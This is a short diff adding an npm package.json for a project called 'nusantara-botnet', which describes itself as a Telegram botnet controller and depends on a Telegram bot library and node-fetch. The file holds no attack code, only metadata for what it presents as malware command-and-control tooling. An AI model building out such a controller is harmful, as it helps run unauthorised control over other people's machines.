@@ -1,0 +1,13 @@
+{
+  "name": "nusantara-botnet",
+  "version": "1.0.0",
+  "description": "Telegram Botnet Controller",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "node-telegram-bot-api": "^0.64.0",
+    "node-fetch": "^2.6.7"
+  }
+}
